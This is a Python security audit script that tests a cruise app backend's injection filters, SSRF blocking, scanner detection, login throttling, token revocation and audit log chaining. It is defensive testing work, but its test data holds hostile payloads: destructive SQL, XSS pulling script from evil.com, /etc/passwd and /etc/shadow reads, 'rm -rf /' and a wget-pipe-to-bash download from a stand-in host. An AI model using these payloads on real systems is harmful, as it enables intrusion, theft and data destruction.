"""
CruiseApp Backend — Full Security Audit Script
Run: python _security_audit.py
Tests all attack vectors, protection layers, and stability.
"""
import sys, os, time, secrets, json

# Mock env before importing security module
os.environ.setdefault('API_KEY',     'test_api_key_1234567890abcdef1234567890abcdef')
os.environ.setdefault('HMAC_SECRET', 'test_hmac_secret_1234567890abcdef1234567890ab')
os.environ.setdefault('JWT_SECRET',  'test_jwt_secret_1234567890abcdef1234567890abc')
os.environ.setdefault('DATABASE_URL','sqlite+aiosqlite:///./test_audit.db')

sys.path.insert(0, os.path.dirname(__file__))

PASS = "[PASS]"
FAIL = "[FAIL]"
WARN = "[WARN]"

issues    = []
warnings  = []
passed    = 0

def check(name, condition, expect_true=True, critical=True):
    global passed
    ok = condition if expect_true else not condition
    if ok:
        passed += 1
        print(f"  {PASS}  {name}")
    else:
        mark = FAIL if critical else WARN
        print(f"  {mark}  {name}")
        if critical:
            issues.append(name)
        else:
            warnings.append(name)

print()
print("=" * 65)
print(" CRUISEAPP SECURITY AUDIT")
print("=" * 65)

# ──────────────────────────────────────────────────────────────
# LOAD modules
# ──────────────────────────────────────────────────────────────
print("\n[0] Loading security module ...")
try:
    from utils.security import (
        _SQL_INJECTION_PATTERN, _XSS_PATTERN,
        _PATH_TRAVERSAL_PATTERN, _CMD_INJECTION_PATTERN,
        _SSRF_INTERNAL_PATTERN, _MALICIOUS_UA_PATTERN,
        _sanitize_string, _check_ssrf, _check_malicious_user_agent,
        _check_login_throttle, _record_login_failure, _clear_login_failures,
        _check_nonce_replay, _is_jti_revoked_memory, _add_revoked_jti,
        _check_password_reset_rate, _record_password_reset,
        _record_violation, _ip_blacklist, _ip_violations,
        revoke_token, load_revoked_tokens_from_db, flush_audit_logs_to_db,
        _security_audit_log, _audit_chain,
        _create_token, JWT_SECRET, JWT_ALGORITHM,
    )
    import jwt
    print(f"  {PASS}  Security module loaded")
    passed += 1
except Exception as e:
    print(f"  {FAIL}  Cannot load security module: {e}")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────
# 1. SQL INJECTION
# ──────────────────────────────────────────────────────────────
print("\n[1] SQL INJECTION (15 payloads)")
sqli_cases = [
    ("Classic OR bypass",         "' OR '1'='1"),
    ("DROP TABLE",                "1; DROP TABLE users--"),
    ("UNION SELECT",              "1 UNION SELECT * FROM users"),
    ("Column exfil",              "' UNION SELECT username,password FROM users--"),
    ("Time-based blind",          "1' AND SLEEP(5)--"),
    ("Admin comment bypass",      "admin'--"),
    ("INSERT injection",          "1; INSERT INTO users VALUES ('hx','pw')--"),
    ("DELETE all",                "DELETE FROM trips WHERE 1=1--"),
    ("Comment bypass",            "' OR 1=1/*"),
    ("xp_cmdshell",               "1 EXEC xp_cmdshell('dir')--"),
    ("ALTER TABLE",               "1 ALTER TABLE users ADD COLUMN hacked TEXT"),
    ("Hex encoding",              "SELECT 0x48656c6c6f FROM users"),
    ("Stacked query",             "1'; DROP TABLE users; SELECT '1"),
    ("CREATE",                    "1; CREATE TABLE evil (x TEXT)--"),
    ("UPDATE exfil",              "1; UPDATE users SET password='hacked'--"),
]
for name, payload in sqli_cases:
    check(f"SQLi: {name}", bool(_SQL_INJECTION_PATTERN.search(payload)))

# ──────────────────────────────────────────────────────────────
# 2. XSS
# ──────────────────────────────────────────────────────────────
print("\n[2] CROSS-SITE SCRIPTING (9 payloads)")
xss_cases = [
    ("Script tag",        "<script>alert(1)</script>"),
    ("Remote script",     "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>"),
    ("javascript: URI",   "javascript:alert(1)"),
    ("img onload",        "<img onload=alert(1)>"),
    ("body onresize",     "<body onresize=alert(1)>"),
    ("Spaced script",     "< script >alert(1)< /script >"),
    ("SVG onload",        "<svg onload=alert(1)>"),
    ("Upper JAVASCRIPT:", "JAVASCRIPT:alert(document.cookie)"),
    ("onclick attr",      "onclick=alert(1)"),
]
for name, payload in xss_cases:
    check(f"XSS: {name}", bool(_XSS_PATTERN.search(payload)))

# ──────────────────────────────────────────────────────────────
# 3. PATH TRAVERSAL
# ──────────────────────────────────────────────────────────────
print("\n[3] PATH TRAVERSAL (6 payloads)")
pt_cases = [
    ("Unix dotdot",           "../../etc/passwd"),
    ("Windows dotdot",        "..\\..\\.\\windows\\system32"),
    ("%2e%2e encoding",       "%2e%2e%2fetc%2fpasswd"),
    ("Mixed encoding",        "..%2F..%2Fetc%2Fshadow"),
    ("Double encoding",       "%252e%252e%252fetc%252fpasswd"),
    ("Dotdot slash forward",  "....//....//etc/passwd"),
]
for name, payload in pt_cases:
    check(f"PathTraversal: {name}", bool(_PATH_TRAVERSAL_PATTERN.search(payload)))

# ──────────────────────────────────────────────────────────────
# 4. SSRF
# ──────────────────────────────────────────────────────────────
print("\n[4] SSRF — Internal address blocking (10 payloads)")
ssrf_cases = [
    ("localhost",              "http://localhost/admin"),
    ("127.0.0.1",              "http://127.0.0.1:8080/secret"),
    ("192.168.x.x",            "http://192.168.1.1/router"),
    ("10.x.x.x",               "http://10.0.0.1/internal"),
    ("file:// protocol",       "file:///etc/passwd"),
    ("gopher:// protocol",     "gopher://evil.com"),
    ("AWS metadata",           "http://169.254.169.254/metadata"),
    ("0.0.0.0",                "http://0.0.0.0:8000/admin"),
    ("172.16.x.x",             "http://172.16.0.1/internal"),
    ("IPv6 loopback",          "::1"),
]
for name, payload in ssrf_cases:
    check(f"SSRF: {name}", _check_ssrf(payload))

# Legitimate URLs should NOT be blocked
legit_urls = [
    "https://api.stripe.com/v1/charges",
    "https://maps.googleapis.com/maps/api/geocode",
    "https://api.emailjs.com/api/v1.0/email/send",
]
for url in legit_urls:
    check(f"SSRF false-positive: {url[:40]}", _check_ssrf(url), expect_true=False, critical=False)

# ──────────────────────────────────────────────────────────────
# 5. COMMAND INJECTION
# ──────────────────────────────────────────────────────────────
print("\n[5] COMMAND INJECTION (7 payloads)")
cmd_cases = [
    ("Semicolon chain",       "; rm -rf /"),
    ("Pipe to cat",           "| cat /etc/passwd"),
    ("Dollar-paren subshell", "$(whoami)"),
    ("eval",                  "test eval bash"),
    ("exec",                  "exec /bin/bash"),
    ("/etc/ path",            "open /etc/passwd"),
    ("wget pipe",             "wget http://evil.com/x.sh | bash"),
]
for name, payload in cmd_cases:
    check(f"CmdInjection: {name}", bool(_CMD_INJECTION_PATTERN.search(payload)))

# ──────────────────────────────────────────────────────────────
# 6. MALICIOUS USER-AGENT DETECTION
# ──────────────────────────────────────────────────────────────
print("\n[6] SCANNER / EXPLOIT TOOL DETECTION")
bad_uas = [
    ("sqlmap",             "sqlmap/1.7.9#stable"),
    ("nikto",              "Nikto/2.1.6"),
    ("nessus",             "Mozilla/5.0 Nessus scanner"),
    ("nuclei",             "nuclei/2.9.0"),
    ("gobuster",           "gobuster/3.1.0"),
    ("python-requests old","python-requests/2.0.1"),
    ("wfuzz",              "wfuzz/3.1.0"),
    ("acunetix",           "acunetix-aspect-security"),
    ("masscan",            "masscan/1.3"),
]
for name, ua in bad_uas:
    check(f"Blocks scanner: {name}", _check_malicious_user_agent(ua))

good_uas = [
    ("iPhone Safari",    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)"),
    ("Flutter Dart",     "Dart/3.0 (dart:io)"),
    ("Cruise app",       "Cruise/1.4.2 Flutter iOS/16.0"),
    ("Chrome",           "Mozilla/5.0 Chrome/110.0.0.0"),
    ("Python requests 2.31", "python-requests/2.31.0"),
]
for name, ua in good_uas:
    check(f"No false positive: {name}", _check_malicious_user_agent(ua), expect_true=False, critical=False)

# ──────────────────────────────────────────────────────────────
# 7. BRUTE FORCE PROTECTION
# ──────────────────────────────────────────────────────────────
print("\n[7] BRUTE FORCE / LOGIN THROTTLE")
test_ip = '1.2.3.100'
_clear_login_failures(test_ip)
check("Not blocked at start", _check_login_throttle(test_ip), expect_true=False)
for i in range(4):
    _record_login_failure(test_ip, f'u{i}@test.com')
check("Not blocked at 4 fails", _check_login_throttle(test_ip), expect_true=False)
_record_login_failure(test_ip, 'u5@test.com')
check("Blocked at 5 fails", _check_login_throttle(test_ip))
_clear_login_failures(test_ip)
check("Unblocked after clear", _check_login_throttle(test_ip), expect_true=False)

# ──────────────────────────────────────────────────────────────
# 8. NONCE REPLAY PROTECTION
# ──────────────────────────────────────────────────────────────
print("\n[8] NONCE REPLAY PROTECTION")
n1 = secrets.token_hex(16)
n2 = secrets.token_hex(16)
check("First use: not replay",  _check_nonce_replay(n1), expect_true=False)
check("Second use: is replay",  _check_nonce_replay(n1))
check("Different nonce: ok",    _check_nonce_replay(n2), expect_true=False)
check("Different nonce replay", _check_nonce_replay(n2))

# ──────────────────────────────────────────────────────────────
# 9. JWT REVOCATION
# ──────────────────────────────────────────────────────────────
print("\n[9] JWT REVOCATION")
jti1 = secrets.token_hex(16)
jti2 = secrets.token_hex(16)
exp  = time.monotonic() + 3600
check("JTI not revoked before adding", _is_jti_revoked_memory(jti1), expect_true=False)
_add_revoked_jti(jti1, exp)
check("JTI revoked after adding",      _is_jti_revoked_memory(jti1))
check("Different JTI not revoked",     _is_jti_revoked_memory(jti2), expect_true=False)

# Expired JTI should not be flagged as revoked (TTL cleanup)
jti_exp = secrets.token_hex(16)
_add_revoked_jti(jti_exp, time.monotonic() - 1)  # already expired
check("Expired revoked JTI returns False", _is_jti_revoked_memory(jti_exp), expect_true=False)

# JWT token created has jti field
token = _create_token(999, role="rider", status="active")
payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
check("JWT payload has jti", 'jti' in payload)
check("JWT payload has sub", payload.get('sub') == '999')
check("JWT payload has type=access", payload.get('type') == 'access')

# ──────────────────────────────────────────────────────────────
# 10. PASSWORD RESET RATE LIMIT
# ──────────────────────────────────────────────────────────────
print("\n[10] PASSWORD RESET RATE LIMITING")
email = f'rtest_{secrets.token_hex(4)}@example.com'
check("Not limited at start", _check_password_reset_rate(email), expect_true=False)
for _ in range(3):
    _record_password_reset(email)
check("Limited after 3 attempts", _check_password_reset_rate(email))

# ──────────────────────────────────────────────────────────────
# 11. IP AUTO-BAN
# ──────────────────────────────────────────────────────────────
print("\n[11] IP AUTO-BAN (20 violations threshold)")
ban_ip = f'200.200.{secrets.token_bytes(1)[0]}.{secrets.token_bytes(1)[0]}'
for _ in range(19):
    _record_violation(ban_ip)
check("Not banned at 19", ban_ip in _ip_blacklist, expect_true=False)
_record_violation(ban_ip)
check("Banned at 20", ban_ip in _ip_blacklist)

# ──────────────────────────────────────────────────────────────
# 12. CREDENTIAL STUFFING DETECTION
# ──────────────────────────────────────────────────────────────
print("\n[12] CREDENTIAL STUFFING DETECTION")
cs_ip = f'100.101.{secrets.token_bytes(1)[0]}.1'
_clear_login_failures(cs_ip)
for i in range(10):
    _record_login_failure(cs_ip, f'victim{i}@gmail.com')
check("IP banned after 10 unique accounts", cs_ip in _ip_blacklist)

# ──────────────────────────────────────────────────────────────
# 13. AUDIT LOG INTEGRITY (hash chain)
# ──────────────────────────────────────────────────────────────
print("\n[13] AUDIT LOG HASH CHAIN INTEGRITY")
initial_len = len(_audit_chain)
_security_audit_log("test_event", "1.2.3.4", "audit_chain_test")
_security_audit_log("test_event2", "1.2.3.4", "audit_chain_test2")
check("Audit log grows",  len(_audit_chain) > initial_len)
if len(_audit_chain) >= 2:
    e1 = _audit_chain[-2]
    e2 = _audit_chain[-1]
    check("Hash chain linked", e2['prev'] == e1['hash'])
    check("Entry has hash",    'hash' in e2 and len(e2['hash']) == 64)

# ──────────────────────────────────────────────────────────────
# 14. _sanitize_string raises on attack payloads
# ──────────────────────────────────────────────────────────────
print("\n[14] _sanitize_string() blocks injection attempts")
from fastapi import HTTPException
for label, payload in [
    ("SQLi",           "' UNION SELECT * FROM users--"),
    ("XSS",            "<script>alert(1)</script>"),
    ("Path traversal", "../../etc/passwd"),
]:
    try:
        _sanitize_string(payload)
        check(f"sanitize blocks {label}", False)  # should have raised
    except HTTPException:
        check(f"sanitize blocks {label}", True)
    except Exception as e:
        check(f"sanitize blocks {label} (wrong exc: {e})", False)

# Legit strings should pass
for s in ["John Doe", "user@example.com", "Miami, FL", "123 Main St"]:
    try:
        result = _sanitize_string(s)
        check(f"sanitize allows legit: '{s}'", True)
    except Exception:
        check(f"sanitize allows legit: '{s}'", False, critical=False)

# ──────────────────────────────────────────────────────────────
# FINAL REPORT
# ──────────────────────────────────────────────────────────────
total = passed + len(issues)
print()
print("=" * 65)
print(f" SECURITY AUDIT COMPLETE")
print(f" Passed:   {passed}")
print(f" Failed:   {len(issues)}")
print(f" Warnings: {len(warnings)}")
print("=" * 65)

if issues:
    print("\nCRITICAL ISSUES:")
    for i, issue in enumerate(issues, 1):
        print(f"   [{i}] {issue}")

if warnings:
    print("\nWARNINGS (non-critical):")
    for i, w in enumerate(warnings, 1):
        print(f"   [{i}] {w}")

if not issues:
    print("\n  ALL CRITICAL CHECKS PASSED -- Server is hardened.")

print()
sys.exit(1 if issues else 0)
